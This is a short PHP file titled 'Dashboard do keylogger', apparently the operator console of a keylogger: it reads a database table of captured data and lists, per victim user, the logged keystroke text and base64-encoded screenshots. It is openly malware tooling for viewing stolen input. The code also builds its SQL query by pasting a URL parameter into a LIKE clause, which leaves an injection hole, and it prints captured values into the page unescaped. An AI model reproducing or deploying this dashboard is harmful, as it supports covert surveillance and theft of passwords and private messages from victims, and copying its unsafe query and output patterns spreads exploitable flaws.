<?php
include_once 'connect.php';
include_once 'crud.php';
$user = filter_input(INPUT_GET, 'user', FILTER_SANITIZE_STRING);
$crud = new App\Dashboard\Crud('dados');
$selector = 'ORDER BY id DESC';
if (isset($user)) {
    $selector = 'WHERE user LIKE "' . $user .'" ORDER BY id DESC' ;
}
$dados = $crud->readAllTable('*', $selector);
?>
<html>
<head>
    <title>Dashboard do keylogger</title>
    <style>
    .card {
        display: block;
        border: 1px solid #000;
        margin-bottom: 12px;
        padding: 10px;
    }
    .img {
        width: 400px;
    }
    </style>
</head>
<body>
    <?php
    foreach ($dados as $key => $value):
    ?>
    <div class="card">
        <?='ID: ' . $value['id'] . ' - User: <a href="?user='.$value['user'].'">' . $value['user'] . '</a> - Texto: ' . $value['texto'] . ' - print: <img class="img" src="data:image/png;base64,' . substr($value['imagem'], 2, -1) . '"/>'?>
        
    </div>
    <?php
    endforeach;
    ?>
</body>
</html>